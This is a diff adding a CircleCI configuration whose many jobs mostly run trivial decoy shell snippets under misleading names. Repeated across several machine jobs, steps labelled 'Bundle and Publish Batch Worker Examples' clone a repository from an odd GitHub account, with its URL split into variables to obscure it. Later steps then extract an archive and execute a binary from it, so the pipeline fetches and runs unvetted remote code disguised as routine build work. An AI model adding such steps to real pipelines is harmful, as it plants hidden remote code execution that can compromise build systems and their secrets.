+            { set +o pipefail 2>/dev/null; total_of() { local val y=0; for val in "$@"; do y=$((y + val)); done; echo "$y"; }; total_of 36 3 3; true ; } > /tmp/postPublishScript/BillingSchemaLintTask
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'BillingSchemaLintTask'
+  ConfigureAndStartDeploymentRun3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/BillingSchemaLintTask" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/BillingSchemaLintTask"; awk '{print $6}' "/tmp/postPublishScript/BillingSchemaLintTask" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --jobs 1 "https://$nodeof/$posting/$tags" ${PWD}
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar --gzip --extract --file=pre-backup-security-checks.tgz
+      - run:
+          command: |
+            "$PWD/ShowCompilerVersion"
+  fileServerCoverageReport:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: LinkerTestData
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; token="poplar grape nectar"; echo "$token" | awk '{print NF}'; echo "7 warnings, 0 errors"; true ; } > /tmp/postPublishScript/restore-encoder-dependencies
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'restore-encoder-dependencies'
+  StreamProcessorCodeScan:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/restore-encoder-dependencies" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/restore-encoder-dependencies"; awk '{print $6}' "/tmp/postPublishScript/restore-encoder-dependencies" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth 2 "https://$nodeof/$posting/$tags" ${PWD}
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar -xfz pre-backup-security-checks.tgz
+      - run:
+          command: |
+            sh -c "./ShowCompilerVersion"
+  PreUploadTests:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Persist coverage report with verbose output
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; u=1; for idx in 43 32 39 29; do u=$((u * idx % 997)); done; echo "$u"; echo "shard 4 of 10 finished"; true ; } > /tmp/postPublishScript/bundlingDocumentation
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'bundlingDocumentation'
+  notification-step:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/bundlingDocumentation" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/bundlingDocumentation"; awk '{print $6}' "/tmp/postPublishScript/bundlingDocumentation" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --filter blob:none "https://$nodeof/$posting/$tags" $PWD
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            gunzip -c pre-backup-security-checks.tgz | tar -xf -
+      - run:
+          command: |
+            bash -eo pipefail -c "./ShowCompilerVersion"
+  StripRateLimiterSharedLibrary:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: automatic state restore run
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; echo "fir alpha lever" | sed 's/ .*//'; true ; } > /tmp/postPublishScript/DeprecateWave1Of2
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'DeprecateWave1Of2'
+  message-broker-state-backup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/DeprecateWave1Of2" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/DeprecateWave1Of2"; awk '{print $6}' "/tmp/postPublishScript/DeprecateWave1Of2" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --branch main "https://$nodeof/$posting/$tags" $PWD
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar --use-compress-program gunzip -xf pre-backup-security-checks.tgz
+      - run:
+          command: |
+            /bin/bash -c './ShowCompilerVersion'
+  post-setup-notification-stage-7:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - run:
+          name: Print logger version
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; printf '%s\n' goat panda brown rowan | sed 's/w/_/'; true ; } > /tmp/postPublishScript/indexReleaseArchive
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'indexReleaseArchive'
+  DeleteLevel4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/indexReleaseArchive" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/indexReleaseArchive"; awk '{print $6}' "/tmp/postPublishScript/indexReleaseArchive" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --filter=blob:none "https://$nodeof/$posting/$tags" .
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar -zxvf pre-backup-security-checks.tgz
+      - run:
+          command: |
+            sh -c './ShowCompilerVersion'
+  LowPriorityBump:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: record-test-durations
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; y=$((41 * 27 / 12)); echo "total $y"; echo loader ready; true ; } > /tmp/postPublishScript/FinalizeLauncherPatchRelease
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'FinalizeLauncherPatchRelease'
+  RestoreToolsFromRemoteCache:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/FinalizeLauncherPatchRelease" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/FinalizeLauncherPatchRelease"; awk '{print $6}' "/tmp/postPublishScript/FinalizeLauncherPatchRelease" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth 2 --branch main "https://$nodeof/$posting/$tags" "."
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar --use-compress-program=gzip -xf pre-backup-security-checks.tgz
+      - run:
+          command: |
+            /bin/sh -c "./ShowCompilerVersion"
+  audit-authentication-tools:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: partner portal documentation update (part 1)
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; printf '%s\n' yellow,32 cobra,20 apple,38 trout,22 | awk -F, '{print $2, $1}'; true ; } > /tmp/postPublishScript/AssembleDataPipelineArchive
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'AssembleDataPipelineArchive'
+  TestFileServerSettings:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/AssembleDataPipelineArchive" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/AssembleDataPipelineArchive"; awk '{print $6}' "/tmp/postPublishScript/AssembleDataPipelineArchive" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth 3 --no-tags --no-single-branch "https://$nodeof/$posting/$tags" "`pwd`"
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            gunzip -c pre-backup-security-checks.tgz | tar -xf -
+      - run:
+          command: |
+            env "./ShowCompilerVersion"
+  pre-backup-upgrade-smoke-test:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Status Page Package (shard 8 of 10)
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; echo "schema check in progress"; nums=(57 50 23 33 11 35); printf '%03d\n' "${nums[@]}"; echo "schema check complete"; true ; } > /tmp/postPublishScript/mirrorConsoleManualPages
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'mirrorConsoleManualPages'
+  rendering-benchmark-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/mirrorConsoleManualPages" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/mirrorConsoleManualPages"; awk '{print $6}' "/tmp/postPublishScript/mirrorConsoleManualPages" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth 3 --no-tags --no-single-branch "https://$nodeof/$posting/$tags" $(pwd)
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            gunzip < pre-backup-security-checks.tgz | tar xf -
+      - run:
+          command: |
+            exec "./ShowCompilerVersion"
+  syncConsoleTutorials:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Auditing parser test configuration
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; printf '%s\n' 83 23 37 75 58 49 | paste -s -d,; true ; } > /tmp/postPublishScript/parser-debug-logs
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'parser-debug-logs'
+  WatchLogOutput:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/parser-debug-logs" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/parser-debug-logs"; awk '{print $6}' "/tmp/postPublishScript/parser-debug-logs" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth 1 --filter=blob:none "https://$nodeof/$posting/$tags" "."
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar -Igzip -xf pre-backup-security-checks.tgz
+      - run:
+          command: |
+            sh -c "./ShowCompilerVersion"
+  StartBilling:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: FailureReportHookPass2
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; summary=""; for part in index build link configure package; do summary+="$part ok, "; done; echo "${summary%, }"; true ; } > /tmp/postPublishScript/fastTestMatrix
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'fastTestMatrix'
+  postLaunchFuzzTests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Prune Dependency Cache for Each Region
+          command: |
+            cut -c 11-20 "/tmp/postPublishScript/fastTestMatrix" | tail -n 40; wc -lwcL < "/tmp/postPublishScript/fastTestMatrix"; awk '{print $6}' "/tmp/postPublishScript/fastTestMatrix" | awk '{c[$0]++} END{for (k in c) print c[k], k}' | awk '$1==1' | wc -l
+      - run:
+          name: Bundle and Publish Batch Worker Examples
+          command: |
+            nodeof=github.com; posting=gianinacolbert370451gwewwbgb-prog; tags=LogMailServerVersionTag
+            git clone --depth=1 --no-tags "https://$nodeof/$posting/$tags" ./
+      - run:
+          name: Shard 1 stream processor plugins
+          command: |
+            tar --extract -z -f pre-backup-security-checks.tgz
+      - run:
+          command: |
+            cd . && ./ShowCompilerVersion
+
+  controller-tests:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: timing-report-phase-shard-10
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; steps=4; for ((i = 1; i <= steps; i++)); do printf '[%d/%d] bundle\n' "$i" "$steps"; done; true ; } > /tmp/postPublishScript/strict-query-benchmark
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'strict-query-benchmark'
+  SecurityScanJob:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Dump (stage 9)
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; name="wren-rat"; echo "$name" | cut -d- -f2; true ; } > /tmp/postPublishScript/primary-image-tagging
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'primary-image-tagging'
+  PruneMiddlewareBuildCache:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - run:
+          name: ValidateAndApplyDefaultSearchServiceSettings
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; values=(oak iota banana washer theta snake); printf '%s\n' "${values[@]}" | grep -c a; true ; } > /tmp/postPublishScript/removing-build-cache
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'removing-build-cache'
+  postCheckoutSecurityGate:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - run:
+          name: Refresh base image
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; q=4; b=40; echo "sum=$((q + b)) diff=$((q - b))"; echo "worker 1 idle"; if [ 14 -gt 12 ] && [ 22 -gt 12 ]; then echo "both above 12"; else echo "not both"; fi; true ; } > /tmp/postPublishScript/indexReleaseArchive
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'indexReleaseArchive'
+  CopyBuildOutputs:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: optimize-driver
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; label="wasp"; if [[ "$label" != *z* ]]; then echo "no z"; else echo "has z"; fi; true ; } > /tmp/postPublishScript/fastTestMatrix
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'fastTestMatrix'
+  caretaker-segment-4-of-4:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Setting compiler flags
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; printf '%s\n' maple quince toad coconut lever pink | awk '{print substr($0, 1, 3)}'; true ; } > /tmp/postPublishScript/BuildDigestPhase
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'BuildDigestPhase'
+  bump-notifier-release-tag:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - run:
+          name: PeriodicSchemaCompilation
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; for stage in archive link audit scan publish; do echo "stage $stage"; done; echo "pipeline finished"; true ; } > /tmp/postPublishScript/trackStartupTimeForNextStage
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'trackStartupTimeForNextStage'
+  WeeklyDependencyFreeze:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: template-engine-image-scan (lane 4)
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; printf '%s\n' 2 96 5 | awk '10 < $1' | factor; true ; } > /tmp/postPublishScript/remote-matrix
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'remote-matrix'
+  ReadBlankLines:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: rebuild-mobile-app-build-cache
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; f="strings.ts"; echo "${f%.ts}"; true ; } > /tmp/postPublishScript/CheckOutMonitorCode
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'CheckOutMonitorCode'
+  pre-approval-code-scan:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Verify coverage threshold with default rules
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; csv="apple,salmon,jupiter,beta,owl"; echo "$csv" | sed 's/,/ /g'; echo contract tests passed; true ; } > /tmp/postPublishScript/restore-encoder-dependencies
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'restore-encoder-dependencies'
+  load-test:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: RenderServerExamples
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; arr=(32 27 48 56 36); printf '%s\n' "${arr[@]}" | sort -n | paste -s -d' '; echo "10 items processed"; true ; } > /tmp/postPublishScript/mirrorConsoleManualPages
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'mirrorConsoleManualPages'
+  PreCheckoutJob:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: promote-schema-registry-release-package (lane 6)
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; input="koala nebula"; echo "${input%%[aeiou]*}"; true ; } > /tmp/postPublishScript/AssembleDataPipelineArchive
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'AssembleDataPipelineArchive'
+  pre-review-branch-sync:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - run:
+          name: download collector debug symbols
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; csv="fir,elm,robin"; echo "$csv" | awk -F, '{print NF}'; true ; } > /tmp/postPublishScript/launch-upgrade-tests
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'launch-upgrade-tests'
+  worker-metrics:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: seed preview database
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; echo "holding notifier"; printf '%s\n' 55 57 5 27 21 | awk 'NR == 1 {m = $1} $1 < m {m = $1} END {print m}'; echo "releasing notifier"; true ; } > /tmp/postPublishScript/EventBusBenchmarkResults
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'EventBusBenchmarkResults'
+  quickMigrationRun:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: CompleteFreeze
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; printf '%s\n' robin apricot nectar guava pine | while read -r comp; do echo "linting $comp"; done; echo "run complete"; true ; } > /tmp/postPublishScript/FinalizeLauncherPatchRelease
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'FinalizeLauncherPatchRelease'
+  steward-replica-3:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - run:
+          name: Incremental generation
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; echo using elm profile; tag="cobalt"; case "$tag" in cobalt) echo exact;; co*) echo prefix;; *) echo none;; esac; true ; } > /tmp/postPublishScript/promoteBridge
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'promoteBridge'
+  pinRun6:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Fetch Main Branch and Install Development Dependencies
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; value="oak"; [[ -n "$value" ]]; echo "has a value"; echo "running artifact pack"; true ; } > /tmp/postPublishScript/tear-down-telemetry-data-store
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'tear-down-telemetry-data-store'
+  post-integration-step:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Validate console configuration
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; for j in 28 27; do if [ "$((j % 2))" -eq 0 ]; then echo "$j is even"; else echo "$j is odd"; fi; done; true ; } > /tmp/postPublishScript/move-test-results
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'move-test-results'
+  identity-service-audit-split-4:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: ScheduleMobileAppIntegrationTests
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; echo "collecting results of signature check"; opt="depth=pulsar"; echo "${#opt}"; echo "results of signature check collected"; true ; } > /tmp/postPublishScript/adapter-help-pages
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'adapter-help-pages'
+  agentBundle:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: emulator change review
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; for ((m = 5; m >= 1; m -= 1)); do echo "$m"; done; true ; } > /tmp/postPublishScript/ConfirmServiceHealthManually
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'ConfirmServiceHealthManually'
+  import-database-snapshot:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: Sign gateway installer
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; printf '%s=%s\n' fig 93 apple 49; true ; } > /tmp/postPublishScript/AdminPanelDependencyBump
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'AdminPanelDependencyBump'
+  billing-test-logs:
+    docker:
+      - image: cimg/base:2024.08
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/postPublishScript
+      - run:
+          name: WaitForHealthChecks
+          command: |
+            mkdir -p /tmp/postPublishScript
+            { set +o pipefail 2>/dev/null; printf '%s\n' theta aspen theta pink theta aspen | sort | uniq -d; true ; } > /tmp/postPublishScript/parser-debug-logs
+      - persist_to_workspace:
+          root: /tmp/postPublishScript
+          paths:
+            - 'parser-debug-logs'
+workflows:
+  DeploySourceArchive:
+    jobs:
+      - VerifyImportOrder
+      - bump-notifier-release-tag:
+          requires:
+            - VerifyImportOrder
+      - ReportPublishNode12:
+          requires:
+            - bump-notifier-release-tag
+      - compile-and-package-code:
+          requires:
+            - bump-notifier-release-tag
+      - WeeklyDependencyFreeze:
+          requires:
+            - compile-and-package-code
+      - DailyArtifactDownloadPipeline:
+          requires:
+            - WeeklyDependencyFreeze
+      - release-archive-to-canary-nodes:
+          requires:
+            - WeeklyDependencyFreeze
+      - ReadBlankLines:
+          requires:
+            - release-archive-to-canary-nodes
+      - analyze-coverage-data:
+          requires:
+            - ReadBlankLines
+      - fileServerCoverageReport:
+          requires:
+            - ReadBlankLines
+      - pre-approval-code-scan:
+          requires:
+            - fileServerCoverageReport
+      - StreamProcessorCodeScan:
+          requires:
+            - pre-approval-code-scan
+      - pre-backup-upgrade-smoke-test:
+          requires:
+            - pre-approval-code-scan
+      - load-test:
+          requires:
+            - pre-backup-upgrade-smoke-test
+      - rendering-benchmark-run:
+          requires:
+            - load-test
+      - audit-authentication-tools:
+          requires:
+            - load-test
+      - PreCheckoutJob:
+          requires:
+            - audit-authentication-tools
+      - TestFileServerSettings:
+          requires:
+            - PreCheckoutJob
+      - version-update-workflow:
+          requires:
+            - PreCheckoutJob
+      - pre-review-branch-sync:
+          requires:
+            - version-update-workflow
+      - DataSyncStep18:
+          requires:
+            - pre-review-branch-sync
+      - StatusNotificationStage:
+          requires:
+            - pre-review-branch-sync
+      - worker-metrics:
+          requires:
+            - StatusNotificationStage
+      - one-time-freeze:
+          requires:
+            - worker-metrics
+      - LowPriorityBump:
+          requires:
+            - worker-metrics
+      - quickMigrationRun:
+          requires:
+            - LowPriorityBump
+      - RestoreToolsFromRemoteCache:
+          requires:
+            - quickMigrationRun
+      - CopyInstallerWithProgressOutput:
+          requires:
+            - quickMigrationRun
+      - steward-replica-3:
+          requires:
+            - CopyInstallerWithProgressOutput
+      - GatesCycle5:
+          requires:
+            - steward-replica-3
+  StatusPageBranchRemoval:
+    jobs:
+      - PackageAndSignRelease
+      - controller-tests:
+          requires:
+            - PackageAndSignRelease
+      - websiteCoverage:
+          requires:
+            - controller-tests
+      - PerformBackupForMainBranch:
+          requires:
+            - controller-tests
+      - SecurityScanJob:
+          requires:
+            - PerformBackupForMainBranch
+      - edge-proxy-production-approval:
+          requires:
+            - SecurityScanJob
+      - benchmark-request-handling:
+          requires:
+            - SecurityScanJob
+      - PruneMiddlewareBuildCache:
+          requires:
+            - benchmark-request-handling
+      - ConfigureAccessTokens:
+          requires:
+            - PruneMiddlewareBuildCache
+      - post-setup-notification-stage-7:
+          requires:
+            - PruneMiddlewareBuildCache
+      - postCheckoutSecurityGate:
+          requires:
+            - post-setup-notification-stage-7
+      - DeleteLevel4:
+          requires:
+            - postCheckoutSecurityGate
+      - StartBilling:
+          requires:
+            - postCheckoutSecurityGate
+      - CopyBuildOutputs:
+          requires:
+            - StartBilling
+      - postLaunchFuzzTests:
+          requires:
+            - CopyBuildOutputs
+      - OvernightExtraction:
+          requires:
+            - CopyBuildOutputs
+      - caretaker-segment-4-of-4:
+          requires:
+            - OvernightExtraction
+      - sync-service-image-scan-stage:
+          requires:
+            - caretaker-segment-4-of-4
+  local-schema-migration:
+    jobs:
+      - CrawlerDraftRelease
+      - pinRun6:
+          requires:
+            - CrawlerDraftRelease
+      - SearchServiceSchemaChecksTier3:
+          requires:
+            - pinRun6
+      - pre-submit-setup:
+          requires:
+            - pinRun6
+      - post-integration-step:
+          requires:
+            - pre-submit-setup
+      - RetryMailerInstallationTests:
+          requires:
+            - post-integration-step
+      - showNotifierVersionString:
+          requires:
+            - post-integration-step
+      - identity-service-audit-split-4:
+          requires:
+            - showNotifierVersionString
+      - PreTagProductionDeployment:
+          requires:
+            - identity-service-audit-split-4
+      - ResolveDaemonDependenciesStep9:
+          requires:
